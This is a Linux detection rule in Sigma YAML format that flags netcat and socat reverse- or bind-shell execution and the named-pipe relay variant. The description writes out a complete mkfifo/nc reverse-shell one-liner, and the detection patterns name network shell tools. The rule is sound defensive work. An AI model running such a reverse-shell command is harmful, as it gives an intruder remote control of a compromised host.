title: Netcat or Socat Reverse Shell Execution
id: 1adaaaca-bfcf-46fe-9bd1-4b475d7bc827
status: experimental
description: >
  Detects netcat or socat invoked with an execute flag, the classic pattern for
  a reverse or bind shell (nc -e / --exec, socat EXEC: / SYSTEM:), and the
  named-pipe relay used with netcat builds that have no -e flag (OpenBSD nc,
  the default on Debian and Ubuntu): mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 |
  nc host port > /tmp/f. In that form nc's own command line is innocuous, so the
  relay is matched on the shell that runs the pipeline. Together with the
  existing /dev/tcp rule this closes the dominant Linux reverse-shell
  primitives after initial access.
  Note: on Linux CommandLine is best-effort /proc enrichment; the execute-flag
  selections below require it, so a very short-lived nc/socat may instead be
  caught only by its network-channel counterpart rule.
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1071/
author: rustinel-rules
date: 2026-07-09
modified: 2026-10-01
tags:
  - attack.execution
  - attack.command-and-control
  - attack.t1059.004
  - attack.t1071
logsource:
  category: process_creation
  product: linux
detection:
  selection_nc:
    Image|endswith:
      - '/nc'
      - '/ncat'
      - '/netcat'
    CommandLine|contains:
      - ' -e '
      - ' -c '
      - '--exec'
      - '--sh-exec'
      - '--lua-exec'
  selection_socat:
    Image|endswith: '/socat'
    CommandLine|contains:
      - 'exec:'
      - 'EXEC:'
      - 'system:'
      - 'SYSTEM:'
  selection_fifo_shell:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
      - '/ksh'
      - '/busybox'
  selection_fifo_pipe:
    CommandLine|contains:
      - 'mkfifo '
      - 'mknod '
  selection_fifo_client:
    CommandLine|re: '(^|[\s|;/])(nc|ncat|netcat|telnet)\s'
  selection_fifo_interpreter:
    # A shell inside the pipeline, not the shell running it: piped into
    # (| /bin/sh) or started interactive after a separator (; sh -i < /tmp/f).
    CommandLine|re:
      - '\|\s*(\S*/)?(ba|da|z|k)?sh(\s|$)'
      - '[;&]\s*(\S*/)?(ba|da|z|k)?sh\s+-i'
  condition: >
    selection_nc or selection_socat
    or (selection_fifo_shell and selection_fifo_pipe and selection_fifo_client
    and selection_fifo_interpreter)
falsepositives:
  - Rare container entrypoints that use socat exec; add a parent-image filter if
    needed.
level: high
rustinel:
  telemetry:
    - process_creation
  expected_false_positive_level: low
  test_status: atomic
